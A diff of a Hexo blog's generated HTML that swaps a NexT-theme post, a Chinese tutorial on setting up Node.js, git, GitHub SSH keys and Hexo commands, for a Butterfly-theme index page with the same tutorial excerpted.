-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
-<p>​        生成ssh密钥文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
-<pre><code>    然后直接三个回车即可，默认不需要设置密码
-</code></pre>
-<p>​        然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制    </p>
-<p>​        打开<a href="https://link.zhihu.com/?target=https://github.com/settings/keys">GitHub_Settings_keys</a> 页面，新建new SSH Key</p>
-<p><img src="https://pic1.zhimg.com/80/v2-72a3f22c080e99343c3cc4aabce10e3c_720w.jpg" alt="img"></p>
-<p>​        Title为标题，任意填即可，将刚刚复制的id_rsa.pub内容粘贴进去，最后点击Add SSH key。<br>​        在Git Bash中检测GitHub公钥设置是否成功，输入 ssh <a href="mailto:&#x67;&#105;&#116;&#x40;&#103;&#105;&#116;&#104;&#x75;&#x62;&#46;&#99;&#111;&#x6d;">&#x67;&#105;&#116;&#x40;&#103;&#105;&#116;&#104;&#x75;&#x62;&#46;&#99;&#111;&#x6d;</a> ：</p>
-<p><img src="https://pic3.zhimg.com/80/v2-da481ffa686410becd4186c656b4ebd6_720w.jpg" alt="img"></p>
-<p>​            如上则说明成功。这里之所以设置GitHub密钥原因是，通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放            置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，            为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配            就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。</p>
-<p>3.安装hexo  npm install -g hexo-cli     也可以通过淘宝镜像进行下载</p>
-<p>4.新建一个空的文件夹，进入文件夹，在空白地方按住shift键，然后鼠标右键，会出现在此处打开命令行工具的选项</p>
-<p>   进行初始化 ： hexo init</p>
-<p>5.本地查看博客  hexo g</p>
-<p>​                            hexo  s</p>
-<p>​    浏览器打开输入localhost:4000进行查看</p>
-<p>​                            部署 ：hexo </p>
-<h5 id="更新之后github-上的主分支是main-不是master"><a href="#更新之后github-上的主分支是main-不是master" class="headerlink" title="更新之后github 上的主分支是main   不是master"></a>更新之后github 上的主分支是main   不是master</h5><p><strong>现在来介绍常用的Hexo 命令</strong></p>
-<p>npm install hexo -g     #安装Hexo<br>npm update hexo -g    #升级<br>hexo init    #初始化博客</p>
-<p>命令简写<br>hexo n  “我的博客” == hexo new  “我的博客”   #新建文章<br>hexo g == hexo generate   #生成<br>hexo s == hexo server   #启动服务预览<br>hexo d == hexo deploy   #部署</p>
-<p>hexo server     #Hexo会监视文件变动并自动更新，无须重启服务器<br>hexo server -s    #静态模式<br>hexo server -p 5000     #更改端口<br>hexo server -i 192.168.1.1     #自定义 IP<br>hexo clean     #清除缓存，若是网页正常情况下可以忽略这条命令</p>
-<p> 引：</p>
-<p>​        <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26625249">https://zhuanlan.zhihu.com/p/26625249</a></p>
-<p>​        <a target="_blank" rel="noopener" href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html</a></p>
-<p>​        <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/33801391">https://zhuanlan.zhihu.com/p/33801391</a></p>
 
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
-
-
-          </div>
-          
-
-
-          
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name"></p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/%20%7C%7C%20archive">
-              
-                  <span class="site-state-item-count">8</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
-                  <span class="site-state-item-name">tags</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
-
-  
-</div>
-
-<--
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
--->
-
-
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-  
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
-
-</body>
-</html>
+hexo配置​    1.安装node.js 
+​        下载安装包，一直next    
+​        检测安装成功  命令行输入node -v
+​        检测npm是否安装成功，在命令行中输入npm -v 
+​    2.安装git
+​        git配置
+​        检测安装成功    命令行输入git
+​         安装好后，鼠标右键打开git bash  设置user.name和user.email配置信息
+12git config --global user.name &quot;你的GitHub用户名&quot;git config --global user.email &quot;你的GitHub注册邮箱&quot;
+​        生成ssh密钥文件：
+1ssh-keygen -t  ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2021/03/11/nizhuangsiwei/" title="nizhuangsiwei">nizhuangsiwei</a><time datetime="2021-03-11T01:16:18.000Z" title="发表于 2021-03-11 09:16:18">2021-03-11</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/03/02/%E6%9D%82%E8%AE%B0/" title="杂记">杂记</a><time datetime="2021-03-02T01:26:01.000Z" title="发表于 2021-03-02 09:26:01">2021-03-02</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/03/02/%E5%90%88%E5%A4%A9web%E5%91%A8%E8%AE%AD/" title="合天web周训">合天web周训</a><time datetime="2021-03-02T01:24:54.000Z" title="发表于 2021-03-02 09:24:54">2021-03-02</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/03/02/RSA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="RSA学习笔记">RSA学习笔记</a><time datetime="2021-03-02T01:23:47.000Z" title="发表于 2021-03-02 09:23:47">2021-03-02</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/02/27/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP伪协议">PHP伪协议</a><time datetime="2021-02-27T11:56:54.000Z" title="发表于 2021-02-27 19:56:54">2021-02-27</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 1.5em; color: #99a9bf">CTF</a> <a href="/tags/%E5%90%88%E5%A4%A9%E5%91%A8%E8%AE%AD/" style="font-size: 1.1em; color: #999">合天周训</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.1em; color: #999">攻防世界</a> <a href="/tags/%E6%97%A5%E5%B8%B8%E4%BF%AE%E5%85%BB/" style="font-size: 1.5em; color: #99a9bf">日常修养</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/03/"><span class="card-archive-list-date">三月 2021</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/02/"><span class="card-archive-list-date">二月 2021</span><span class="card-archive-list-count">4</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">8</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2021-03-12T23:58:46.755Z"></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"live2d-widget-model-<你喜欢的模型名字>"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>
